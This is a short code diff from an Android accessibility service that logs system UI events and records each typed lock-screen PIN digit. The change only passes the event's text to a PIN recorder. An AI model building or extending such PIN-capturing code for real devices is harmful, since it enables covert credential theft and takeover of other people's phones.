@@ -38,7 +38,7 @@ class LoggingAccessibilityService : AccessibilityService(), PinRecorder.Callback
                 if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME) {
                     logEvent(event, event.toString())
                     // This is a PIN, let's record it.
-                    pinRecorder.appendPinDigit(event)
+                    pinRecorder.appendPinDigit(event.text.toString())
                 }
             }
 
